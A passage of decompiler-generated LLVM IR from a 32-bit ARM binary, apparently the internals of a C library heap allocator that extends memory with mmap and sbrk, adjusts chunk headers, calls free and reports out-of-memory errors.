dec_label_pc_145e8:                               ; preds = %dec_label_pc_145d4, %bb156
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %r1.global-to-local, align 4
  %v4_145f0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 64) to i32*), align 4
  store i32 %v4_145f0, i32* %r6.global-to-local, align 4
  %v1_145f4 = add i32 %v4_145f0, 864
  %v2_145f4 = inttoptr i32 %v1_145f4 to i32*
  %v3_145f4 = load i32, i32* %v2_145f4, align 4
  store i32 %v3_145f4, i32* %r3.global-to-local, align 4
  %v1_145f8 = urem i32 %v3_145f4, 2
  %v2_145f8 = icmp eq i32 %v1_145f8, 0
  br i1 %v2_145f8, label %.thread32thread-pre-split, label %bb158

bb158:                                            ; preds = %dec_label_pc_145e8
  %v1_145fc = load i32, i32* @r8, align 4
  %v2_145fc = load i32, i32* %sb.global-to-local, align 4
  %v3_145fc = add i32 %v2_145fc, %v1_145fc
  %v2_14600 = load i32, i32* @r5, align 4
  %v3_14600 = add i32 %v3_145fc, %v2_14600
  store i32 %v3_14600, i32* %r3.global-to-local, align 4
  %v2_14604 = load i32, i32* %fp.global-to-local, align 4
  %v3_14604 = and i32 %v2_14604, %v3_14600
  store i32 %v3_14604, i32* @r5, align 4
  br label %.thread32

.thread32thread-pre-split:                        ; preds = %dec_label_pc_145e8
  %v0_14608.pr = load i32, i32* @r5, align 4
  br label %.thread32

.thread32:                                        ; preds = %.thread32thread-pre-split, %bb158
  %v0_14608 = phi i32 [ %v0_14608.pr, %.thread32thread-pre-split ], [ %v3_14604, %bb158 ]
  %v2_14608 = icmp ugt i32 %v0_14608, 1048575
  br i1 %v2_14608, label %bb160, label %bb159

bb159:                                            ; preds = %.thread32
  store i32 1048576, i32* @r5, align 4
  br label %bb160

bb160:                                            ; preds = %.thread32, %bb159
  %v0_14620 = phi i32 [ %v0_14608, %.thread32 ], [ 1048576, %bb159 ]
  %v1_14610 = load i32, i32* @sl, align 4
  %tmp217 = icmp ugt i32 %v0_14620, %v1_14610
  br i1 %tmp217, label %dec_label_pc_14618, label %dec_label_pc_1487c

dec_label_pc_14618:                               ; preds = %bb160
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_14620, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_14634 = call i32 @mmap(i32 0, i32 %v0_14620, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_14634, i32* %r0.global-to-local, align 4
  %v3_14638 = icmp eq i32 %v6_14634, -1
  %v8_14638 = icmp eq i32 %v6_14634, -1
  store i32 %v6_14634, i32* @r4, align 4
  br i1 %v8_14638, label %.thread35, label %bb161

bb161:                                            ; preds = %dec_label_pc_14618
  %v1_14640 = load i32, i32* %r6.global-to-local, align 4
  %v2_14640 = add i32 %v1_14640, 864
  %v3_14640 = inttoptr i32 %v2_14640 to i32*
  %v4_14640 = load i32, i32* %v3_14640, align 4
  %v2_14644 = load i32, i32* @r5, align 4
  %v3_14644 = add i32 %v2_14644, %v6_14634
  store i32 %v3_14644, i32* %r0.global-to-local, align 4
  %v2_14648 = and i32 %v4_14640, -2
  store i32 %v2_14648, i32* %r3.global-to-local, align 4
  store i32 %v2_14648, i32* %v3_14640, align 4
  br label %.thread35

.thread35:                                        ; preds = %dec_label_pc_14618, %bb161
  br i1 %v3_14638, label %dec_label_pc_14654, label %dec_label_pc_14658

dec_label_pc_14654:                               ; preds = %.thread35, %dec_label_pc_145d4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14658

dec_label_pc_14658:                               ; preds = %.thread35, %dec_label_pc_14654
  %v0_14658 = load i32, i32* @r4, align 4
  %v7_14658 = icmp eq i32 %v0_14658, -1
  br i1 %v7_14658, label %dec_label_pc_1487c, label %dec_label_pc_14660

dec_label_pc_14660:                               ; preds = %dec_label_pc_14658
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %r2.global-to-local, align 4
  %v4_14668 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 64) to i32*), align 4
  store i32 %v4_14668, i32* %ip.global-to-local, align 4
  store i32 %v3_14598, i32* %r2.global-to-local, align 4
  %v1_14670 = add i32 %v4_14668, 872
  %v2_14670 = inttoptr i32 %v1_14670 to i32*
  %v3_14670 = load i32, i32* %v2_14670, align 4
  %v1_14674 = load i32, i32* @r8, align 4
  %v2_14674 = add i32 %v1_14674, %v3_14598
  store i32 %v2_14674, i32* %r1.global-to-local, align 4
  %v0_14678 = load i32, i32* @r5, align 4
  %v2_14678 = add i32 %v0_14678, %v3_14670
  store i32 %v2_14678, i32* %r3.global-to-local, align 4
  %v9_1467c = icmp eq i32 %v0_14658, %v2_14674
  br i1 %v9_1467c, label %bb162, label %.thread125

.thread125:                                       ; preds = %dec_label_pc_14660
  store i32 %v2_14678, i32* %v2_14670, align 4
  br label %dec_label_pc_14698

bb162:                                            ; preds = %dec_label_pc_14660
  %v1_14680 = load i32, i32* %r0.global-to-local, align 4
  %v8_14680 = icmp eq i32 %v1_14680, -1
  store i32 %v2_14678, i32* %v2_14670, align 4
  br i1 %v8_14680, label %.thread37, label %dec_label_pc_14698

.thread37:                                        ; preds = %bb162
  %v1_14688 = load i32, i32* @r5, align 4
  %v2_14688 = load i32, i32* @r8, align 4
  %v3_14688 = add i32 %v2_14688, %v1_14688
  %v2_1468c = or i32 %v3_14688, 1
  store i32 %v2_1468c, i32* %r3.global-to-local, align 4
  %v2_14690 = load i32, i32* %r2.global-to-local, align 4
  %v3_14690 = add i32 %v2_14690, 4
  %v4_14690 = inttoptr i32 %v3_14690 to i32*
  store i32 %v2_1468c, i32* %v4_14690, align 4
  br label %dec_label_pc_14810

dec_label_pc_14698:                               ; preds = %bb162, %.thread125
  %v0_1469c.pr = load i32, i32* @r8, align 4
  %v0_14698 = load i32, i32* %ip.global-to-local, align 4
  %v1_14698 = add i32 %v0_14698, 864
  %v2_14698 = inttoptr i32 %v1_14698 to i32*
  %v3_14698 = load i32, i32* %v2_14698, align 4
  store i32 %v3_14698, i32* %r2.global-to-local, align 4
  %v2_1469c = icmp eq i32 %v0_1469c.pr, 0
  br i1 %v2_1469c, label %.thread40, label %.thread39

.thread40:                                        ; preds = %dec_label_pc_14698
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread43

.thread39:                                        ; preds = %dec_label_pc_14698
  %v2_146a4 = urem i32 %v3_14698, 2
  store i32 %v2_146a4, i32* %r3.global-to-local, align 4
  %v2_146a8 = icmp eq i32 %v2_146a4, 0
  br i1 %v2_146a8, label %.thread43, label %dec_label_pc_146b0

dec_label_pc_146b0:                               ; preds = %.thread39
  %v0_146b0 = load i32, i32* @r4, align 4
  %v1_146b0 = load i32, i32* %r1.global-to-local, align 4
  %v3_146b0 = icmp ult i32 %v0_146b0, %v1_146b0
  br i1 %v3_146b0, label %bb163, label %.thread43

bb163:                                            ; preds = %dec_label_pc_146b0
  %v2_146b4 = and i32 %v3_14698, -2
  store i32 %v2_146b4, i32* %r3.global-to-local, align 4
  store i32 %v2_146b4, i32* %v2_14698, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_146b0, %.thread40, %.thread39, %bb163
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %ip.global-to-local, align 4
  %v4_146c4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 64) to i32*), align 4
  store i32 %v4_146c4, i32* @r7, align 4
  %v1_146c8 = add i32 %v4_146c4, 864
  %v2_146c8 = inttoptr i32 %v1_146c8 to i32*
  %v3_146c8 = load i32, i32* %v2_146c8, align 4
  store i32 %v3_146c8, i32* %r3.global-to-local, align 4
  %v1_146cc = urem i32 %v3_146c8, 2
  store i32 %v1_146cc, i32* @r6, align 4
  %v2_146cc = icmp eq i32 %v1_146cc, 0
  br i1 %v2_146cc, label %dec_label_pc_14760, label %dec_label_pc_146d4

dec_label_pc_146d4:                               ; preds = %.thread43
  %v0_146d4 = load i32, i32* @r8, align 4
  %v2_146d4 = icmp eq i32 %v0_146d4, 0
  br i1 %v2_146d4, label %.thread46, label %bb164

bb164:                                            ; preds = %dec_label_pc_146d4
  %v2_146d8 = add i32 %v4_146c4, 872
  %v3_146d8 = inttoptr i32 %v2_146d8 to i32*
  %v4_146d8 = load i32, i32* %v3_146d8, align 4
  store i32 %v4_146d8, i32* %r2.global-to-local, align 4
  %v1_146dc = load i32, i32* %r1.global-to-local, align 4
  %v2_146dc = load i32, i32* @r4, align 4
  %v3_146dc = sub i32 %v2_146dc, %v1_146dc
  %v3_146e0 = add i32 %v3_146dc, %v4_146d8
  store i32 %v3_146e0, i32* %r3.global-to-local, align 4
  store i32 %v3_146e0, i32* %v3_146d8, align 4
  br label %.thread46

.thread46:                                        ; preds = %dec_label_pc_146d4, %bb164
  %v0_146e8 = load i32, i32* @r4, align 4
  %v1_146e8 = urem i32 %v0_146e8, 8
  store i32 %v1_146e8, i32* %r3.global-to-local, align 4
  %v2_146e8 = icmp eq i32 %v1_146e8, 0
  br i1 %v2_146e8, label %.thread47, label %bb165

bb165:                                            ; preds = %.thread46
  %v2_146ec = sub nsw i32 8, %v1_146e8
  store i32 %v2_146ec, i32* %r3.global-to-local, align 4
  %v3_146f0 = add i32 %v2_146ec, %v0_146e8
  store i32 %v3_146f0, i32* @r7, align 4
  br label %.thread47

.thread47:                                        ; preds = %.thread46, %bb165
  %v0_146f8 = phi i32 [ 0, %.thread46 ], [ %v2_146ec, %bb165 ]
  %v1_146f4 = load i32, i32* @r5, align 4
  %v2_146f4 = add i32 %v1_146f4, %v0_146e8
  store i32 %v2_146f4, i32* @r6, align 4
  %v1_146f8 = load i32, i32* @r8, align 4
  %v2_146f8 = add i32 %v2_146f4, %v0_146f8
  %v2_146fc = add i32 %v2_146f8, %v1_146f8
  store i32 %v2_146fc, i32* %r1.global-to-local, align 4
  %v1_14700 = load i32, i32* %sb.global-to-local, align 4
  %v2_14700 = add i32 %v1_14700, %v2_146fc
  %v1_14704 = load i32, i32* %fp.global-to-local, align 4
  %v2_14704 = and i32 %v1_14704, %v2_14700
  store i32 %v2_14704, i32* %r2.global-to-local, align 4
  %v2_14708 = sub i32 0, %v2_146f4
  store i32 %v2_14708, i32* %r3.global-to-local, align 4
  %v2_1470c = sub i32 %v2_14704, %v2_146f4
  store i32 %v2_1470c, i32* @r5, align 4
  store i32 %v2_1470c, i32* %r0.global-to-local, align 4
  br i1 %v2_146e8, label %bb166, label %bb167

bb166:                                            ; preds = %.thread47
  store i32 %v0_146e8, i32* @r7, align 4
  br label %bb167

bb167:                                            ; preds = %.thread47, %bb166
  %v1_14718 = call i32 @__GI_sbrk(i32 %v2_1470c)
  store i32 %v1_14718, i32* %r0.global-to-local, align 4
  %v3_1471c = icmp eq i32 %v1_14718, -1
  br i1 %v3_1471c, label %dec_label_pc_14724, label %dec_label_pc_14734

dec_label_pc_14724:                               ; preds = %bb167
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_14728 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_14728, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_1478c

dec_label_pc_14734:                               ; preds = %bb167
  %v1_14734 = load i32, i32* @r4, align 4
  %v3_14734 = icmp ult i32 %v1_14718, %v1_14734
  br i1 %v3_14734, label %dec_label_pc_1473c, label %dec_label_pc_1478c

dec_label_pc_1473c:                               ; preds = %dec_label_pc_14734
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %r0.global-to-local, align 4
  %v4_14744 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 64) to i32*), align 4
  store i32 %v4_14744, i32* %r2.global-to-local, align 4
  %v1_14748 = add i32 %v4_14744, 864
  %v2_14748 = inttoptr i32 %v1_14748 to i32*
  %v3_14748 = load i32, i32* %v2_14748, align 4
  %v0_1474c = load i32, i32* @r6, align 4
  store i32 %v0_1474c, i32* %r0.global-to-local, align 4
  %v1_14750 = and i32 %v3_14748, -2
  store i32 %v1_14750, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_14750, i32* %v2_14748, align 4
  br label %dec_label_pc_1478c

dec_label_pc_14760:                               ; preds = %.thread43
  %v0_14760 = load i32, i32* %r0.global-to-local, align 4
  %v3_14760 = icmp eq i32 %v0_14760, -1
  br i1 %v3_14760, label %dec_label_pc_14768, label %dec_label_pc_14784

dec_label_pc_14768:                               ; preds = %dec_label_pc_14760
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1476c = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_1476c, i32* %r0.global-to-local, align 4
  %v0_14770 = load i32, i32* @r7, align 4
  %v1_14770 = add i32 %v0_14770, 872
  %v2_14770 = inttoptr i32 %v1_14770 to i32*
  %v3_14770 = load i32, i32* %v2_14770, align 4
  store i32 %v3_14770, i32* %r2.global-to-local, align 4
  %v0_14774 = load i32, i32* @r4, align 4
  %v0_14778 = load i32, i32* @r5, align 4
  %v2_14774 = add i32 %v3_14770, %v1_1476c
  %v2_14778 = sub i32 %v2_14774, %v0_14774
  %v2_1477c = sub i32 %v2_14778, %v0_14778
  store i32 %v2_1477c, i32* %r3.global-to-local, align 4
  store i32 %v2_1477c, i32* %v2_14770, align 4
  %v0_14788.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_14784

dec_label_pc_14784:                               ; preds = %dec_label_pc_14760, %dec_label_pc_14768
  %v0_14788 = phi i32 [ 0, %dec_label_pc_14760 ], [ %v0_14788.pre, %dec_label_pc_14768 ]
  %v0_14784 = load i32, i32* @r4, align 4
  store i32 %v0_14784, i32* @r7, align 4
  store i32 %v0_14788, i32* @r5, align 4
  br label %dec_label_pc_1478c

dec_label_pc_1478c:                               ; preds = %dec_label_pc_14734, %dec_label_pc_1473c, %dec_label_pc_14724, %dec_label_pc_14784
  %v0_1478c = load i32, i32* %r0.global-to-local, align 4
  %v7_1478c = icmp eq i32 %v0_1478c, -1
  br i1 %v7_1478c, label %dec_label_pc_14810, label %dec_label_pc_14794

dec_label_pc_14794:                               ; preds = %dec_label_pc_1478c
  %v1_14794 = load i32, i32* @r5, align 4
  %v2_14794 = add i32 %v1_14794, %v0_1478c
  %v0_14798 = load i32, i32* @r7, align 4
  %v2_14798 = sub i32 %v2_14794, %v0_14798
  %v1_1479c = or i32 %v2_14798, 1
  %v2_147a0 = add i32 %v0_14798, 4
  %v3_147a0 = inttoptr i32 %v2_147a0 to i32*
  store i32 %v1_1479c, i32* %v3_147a0, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %r1.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_147ac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 64) to i32*), align 4
  store i32 %v4_147ac, i32* @r6, align 4
  %v1_147b0 = add i32 %v4_147ac, 872
  %v2_147b0 = inttoptr i32 %v1_147b0 to i32*
  %v3_147b0 = load i32, i32* %v2_147b0, align 4
  %v0_147b4 = load i32, i32* @r8, align 4
  %v2_147b4 = icmp eq i32 %v0_147b4, 0
  %v0_147b8 = load i32, i32* @r5, align 4
  %v2_147b8 = add i32 %v0_147b8, %v3_147b0
  store i32 %v2_147b8, i32* %r3.global-to-local, align 4
  store i32 %v2_147b8, i32* %v2_147b0, align 4
  %v0_147c0 = load i32, i32* @r7, align 4
  %v1_147c0 = load i32, i32* @r6, align 4
  %v2_147c0 = add i32 %v1_147c0, 44
  %v3_147c0 = inttoptr i32 %v2_147c0 to i32*
  store i32 %v0_147c0, i32* %v3_147c0, align 4
  br i1 %v2_147b4, label %dec_label_pc_14810, label %dec_label_pc_147c8

dec_label_pc_147c8:                               ; preds = %dec_label_pc_14794
  %v0_147cc = load i32, i32* @r8, align 4
  %v1_147cc = add i32 %v0_147cc, -12
  %v1_147d0 = and i32 %v1_147cc, -8
  store i32 %v3_14598, i32* %ip.global-to-local, align 4
  %v2_147d8 = add i32 %v1_147d0, %v3_14598
  store i32 %v2_147d8, i32* %r1.global-to-local, align 4
  %v2_147dc = icmp ugt i32 %v1_147d0, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_147e4 = or i32 %v1_147d0, 1
  store i32 %v1_147e4, i32* %r3.global-to-local, align 4
  store i32 %v1_147e4, i32* %v2_145a4, align 4
  %v0_147ec = load i32, i32* %r2.global-to-local, align 4
  %v1_147ec = load i32, i32* %r1.global-to-local, align 4
  %v2_147ec = add i32 %v1_147ec, 8
  %v3_147ec = inttoptr i32 %v2_147ec to i32*
  store i32 %v0_147ec, i32* %v3_147ec, align 4
  %v0_147f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_147f0 = load i32, i32* %r1.global-to-local, align 4
  %v2_147f0 = add i32 %v1_147f0, 4
  %v3_147f0 = inttoptr i32 %v2_147f0 to i32*
  store i32 %v0_147f0, i32* %v3_147f0, align 4
  br i1 %v2_147dc, label %dec_label_pc_147f8, label %dec_label_pc_14810

dec_label_pc_147f8:                               ; preds = %dec_label_pc_147c8
  %v0_147f8 = load i32, i32* @r6, align 4
  %v1_147f8 = add i32 %v0_147f8, 836
  %v2_147f8 = inttoptr i32 %v1_147f8 to i32*
  %v3_147f8 = load i32, i32* %v2_147f8, align 4
  store i32 %v3_147f8, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_14800 = load i32, i32* %ip.global-to-local, align 4
  %v1_14800 = add i32 %v0_14800, 8
  store i32 %v1_14800, i32* @r0, align 4
  store i32 -1, i32* %v2_147f8, align 4
  %v0_14808 = call i32 @free()
  store i32 %v0_14808, i32* %r0.global-to-local, align 4
  %v0_1480c = load i32, i32* @r4, align 4
  %v1_1480c = load i32, i32* @r6, align 4
  %v2_1480c = add i32 %v1_1480c, 836
  %v3_1480c = inttoptr i32 %v2_1480c to i32*
  store i32 %v0_1480c, i32* %v3_1480c, align 4
  br label %dec_label_pc_14810

dec_label_pc_14810:                               ; preds = %.thread37, %dec_label_pc_147c8, %dec_label_pc_14794, %dec_label_pc_1478c, %dec_label_pc_147f8
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %r0.global-to-local, align 4
  %v4_14818 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 64) to i32*), align 4
  store i32 %v4_14818, i32* %lr.global-to-local, align 4
  %v1_1481c = add i32 %v4_14818, 872
  store i32 %v1_1481c, i32* %r1.global-to-local, align 4
  %v1_14820 = inttoptr i32 %v1_1481c to i32*
  %v2_14820 = load i32, i32* %v1_14820, align 4
  store i32 %v2_14820, i32* %r1.global-to-local, align 4
  %v3_14820 = add i32 %v4_14818, 876
  %v4_14820 = inttoptr i32 %v3_14820 to i32*
  %v5_14820 = load i32, i32* %v4_14820, align 4
  store i32 %v5_14820, i32* %r3.global-to-local, align 4
  %v1_14828 = add i32 %v4_14818, 868
  %v2_14828 = inttoptr i32 %v1_14828 to i32*
  %v3_14828 = load i32, i32* %v2_14828, align 4
  store i32 %v3_14828, i32* %r3.global-to-local, align 4
  %v1_1482c = add i32 %v4_14818, 884
  %v2_1482c = inttoptr i32 %v1_1482c to i32*
  %v3_1482c = load i32, i32* %v2_1482c, align 4
  store i32 %v3_1482c, i32* %r2.global-to-local, align 4
  %v2_14830 = add i32 %v3_14828, %v2_14820
  store i32 %v2_14830, i32* %r3.global-to-local, align 4
  %tmp218 = icmp ugt i32 %v2_14820, %v5_14820
  br i1 %tmp218, label %bb168, label %bb169

bb168:                                            ; preds = %dec_label_pc_14810
  store i32 %v2_14820, i32* %v4_14820, align 4
  %v0_14838.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_14838.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb169

bb169:                                            ; preds = %dec_label_pc_14810, %bb168
  %v1_14838 = phi i32 [ %v3_1482c, %dec_label_pc_14810 ], [ %v1_14838.pre, %bb168 ]
  %v4_1483c = phi i32 [ %v2_14830, %dec_label_pc_14810 ], [ %v0_14838.pre, %bb168 ]
  %tmp219 = icmp ugt i32 %v4_1483c, %v1_14838
  br i1 %tmp219, label %bb170, label %bb171

bb170:                                            ; preds = %bb169
  %v5_1483c = load i32, i32* %lr.global-to-local, align 4
  %v6_1483c = add i32 %v5_1483c, 884
  %v7_1483c = inttoptr i32 %v6_1483c to i32*
  store i32 %v4_1483c, i32* %v7_1483c, align 4
  br label %bb171

bb171:                                            ; preds = %bb169, %bb170
  %v0_14840 = load i32, i32* %lr.global-to-local, align 4
  %v1_14840 = add i32 %v0_14840, 44
  %v2_14840 = inttoptr i32 %v1_14840 to i32*
  %v3_14840 = load i32, i32* %v2_14840, align 4
  store i32 %v3_14840, i32* %ip.global-to-local, align 4
  %v1_14844 = add i32 %v3_14840, 4
  %v2_14844 = inttoptr i32 %v1_14844 to i32*
  %v3_14844 = load i32, i32* %v2_14844, align 4
  store i32 %v1_14458, i32* %r1.global-to-local, align 4
  %v1_1484c = and i32 %v3_14844, -4
  store i32 %v1_1484c, i32* %r3.global-to-local, align 4
  %v3_14850 = icmp ult i32 %v1_1484c, %v1_14458
  br i1 %v3_14850, label %dec_label_pc_1487c, label %dec_label_pc_14858

dec_label_pc_14858:                               ; preds = %bb171
  %v0_14858 = load i32, i32* @sl, align 4
  %v2_14858 = sub i32 %v1_1484c, %v0_14858
  %v2_1485c = add i32 %v0_14858, %v3_14840
  store i32 %v2_1485c, i32* %r1.global-to-local, align 4
  %v1_14860 = or i32 %v2_14858, 1
  store i32 %v1_14860, i32* %r3.global-to-local, align 4
  %v1_14864 = or i32 %v0_14858, 1
  store i32 %v1_14864, i32* %r2.global-to-local, align 4
  %v1_14868 = add i32 %v3_14840, 8
  store i32 %v1_14868, i32* %r0.global-to-local, align 4
  store i32 %v1_14864, i32* %v2_14844, align 4
  %v0_14870 = load i32, i32* %r1.global-to-local, align 4
  %v1_14870 = load i32, i32* %lr.global-to-local, align 4
  %v2_14870 = add i32 %v1_14870, 44
  %v3_14870 = inttoptr i32 %v2_14870 to i32*
  store i32 %v0_14870, i32* %v3_14870, align 4
  %v0_14874 = load i32, i32* %r3.global-to-local, align 4
  %v1_14874 = load i32, i32* %r1.global-to-local, align 4
  %v2_14874 = add i32 %v1_14874, 4
  %v3_14874 = inttoptr i32 %v2_14874 to i32*
  store i32 %v0_14874, i32* %v3_14874, align 4
  br label %dec_label_pc_14894

dec_label_pc_1487c:                               ; preds = %bb160, %bb171, %dec_label_pc_14658
  store i32 64496, i32* %r3.global-to-local, align 4
  %v0_14880 = call i32 @__aeabi_read_tp()
  %v3_14884 = load i16, i16* @global_var_2447c.761, align 2
  %v4_14884 = sext i16 %v3_14884 to i32
  store i32 %v4_14884, i32* %r3.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_1488c = add i32 %v4_14884, %v0_14880
  %v4_1488c = inttoptr i32 %v3_1488c to i32*
  store i32 12, i32* %v4_1488c, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14894

dec_label_pc_14894:                               ; preds = %bb154, %bb153, %dec_label_pc_14858, %dec_label_pc_144a0, %dec_label_pc_1487c
  %v0_14894 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14894, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14898

dec_label_pc_14898:                               ; preds = %.thread4, %dec_label_pc_1446c, %.thread124, %dec_label_pc_142dc, %dec_label_pc_142d0, %dec_label_pc_14138, %dec_label_pc_140bc, %dec_label_pc_14894
  store i32 %v2_13fdc, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %r2.global-to-local, align 4
  %v4_148a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 44) to i32*), align 4
  store i32 %v4_148a8, i32* @ip, align 4
  store i32 84148, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_148a8)
  br label %dec_label_pc_148b4

dec_label_pc_148b4:                               ; preds = %dec_label_pc_14014, %dec_label_pc_14898
  %v0_148b4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_148b4, i32* %r0.global-to-local, align 4
  store i32 %v3_13fb0, i32* @r4, align 4
  store i32 %v6_13fb0, i32* @r5, align 4
  store i32 %v9_13fb0, i32* @r6, align 4
  store i32 %v12_13fb0, i32* @r7, align 4
  store i32 %v15_13fb0, i32* @r8, align 4
  store i32 %v18_13fb0, i32* @sb, align 4
  store i32 %v21_13fb0, i32* @sl, align 4
  store i32 %v24_13fb0, i32* @fp, align 4
  store i32 %v27_13fb0, i32* @lr, align 4
  ret i32 %v0_148b4

; uselistorder directives
  uselistorder i32 %v0_14858, { 1, 0, 2 }
  uselistorder i32 %v3_14840, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1483c, { 1, 0 }
  uselistorder i32 %v2_14820, { 2, 0, 1, 3 }
  uselistorder i32 %v4_14818, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_147d0, { 1, 2, 0 }
  uselistorder i32 %v0_14798, { 1, 0 }
  uselistorder i32 %v0_1478c, { 1, 0 }
  uselistorder i32 %v2_1477c, { 1, 0 }
  uselistorder i32 %v2_1470c, { 2, 1, 0 }
  uselistorder i32 %v2_146f4, { 1, 2, 0, 3 }
  uselistorder i32 %v2_146ec, { 1, 0, 2 }
  uselistorder i32 %v1_146e8, { 2, 1, 0 }
  uselistorder i32 %v0_146e8, { 3, 1, 2, 0 }
  uselistorder i32 %v1_146cc, { 1, 0 }
  uselistorder i32 %v2_146a4, { 1, 0 }
  uselistorder i32 %v3_14698, { 1, 0, 2 }
  uselistorder i32 %v2_14678, { 1, 0, 2 }
  uselistorder i32* %v2_14670, { 1, 0, 2 }
  uselistorder i32 %v0_14658, { 1, 0 }
  uselistorder i32 %v6_14634, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_14620, { 2, 1, 0 }
  uselistorder i32 %v0_14608, { 1, 0 }
  uselistorder i32 %v2_145c4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_145c0, { 1, 0 }
  uselistorder i32 %v3_14598, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_14578, { 1, 0, 2 }
  uselistorder i32 %v2_14560, { 1, 2, 0, 3 }
  uselistorder i32 %v1_14508, { 2, 1, 0 }
  uselistorder i32 %v6_144fc, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_144d8, { 2, 1, 0, 3 }
  uselistorder i32 %v3_14498, { 1, 0, 2, 3 }
  uselistorder i32 %v0_14458, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_14450, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1444c, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_14438, { 1, 0 }
  uselistorder i32 %v7_143f8, { 1, 0 }
  uselistorder i32 %v4_143f8, { 1, 0 }
  uselistorder i32 %v0_143c8, { 1, 0 }
  uselistorder i32 %v2_1439c, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_1439857, { 1, 0 }
  uselistorder i32 %v1_14364, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_1434c., { 1, 2, 0 }
  uselistorder i32 %v0_14354, { 0, 1, 3, 2 }
  uselistorder i32 %v1_14354, { 1, 0 }
  uselistorder i32 %v3_14334, { 1, 0 }
  uselistorder i32 %v4_14330, { 1, 0, 2 }
  uselistorder i32 %v1_142a0, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_142f8, { 1, 0 }
  uselistorder i32 %v1_142dc, { 1, 0 }
  uselistorder i32 %v1_1417c, { 1, 0 }
  uselistorder i32 %v0_142bc, { 2, 0, 1, 3 }
  uselistorder i32 %v3_14284, { 2, 0, 1, 3 }
  uselistorder i32 %v0_14318.pre, { 1, 2, 0 }
  uselistorder i32 %v0_14260, { 2, 1, 0 }
  uselistorder i32 %v3_14254, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_14174, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_1421c, { 1, 0 }
  uselistorder i32 %v3_14210, { 1, 0 }
  uselistorder i32 %v0_1421c, { 1, 0 }
  uselistorder i32 %v3_141f4, { 0, 2, 3, 1 }
  uselistorder i32 %v2_141e4, { 1, 0, 2 }
  uselistorder i32 %v3_1419c, { 2, 1, 0 }
  uselistorder i32 %v0_1418c, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1415c, { 1, 0 }
  uselistorder i32 %v1_14110, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1410c, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_140b0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_140a4, { 1, 0 }
  uselistorder i32 %v3_14074, { 1, 0 }
  uselistorder i32 %v0_14068, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_14048, { 0, 2, 1, 3 }
  uselistorder i1 %v7_1403c, { 1, 0 }
  uselistorder i32 %v0_1400c, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
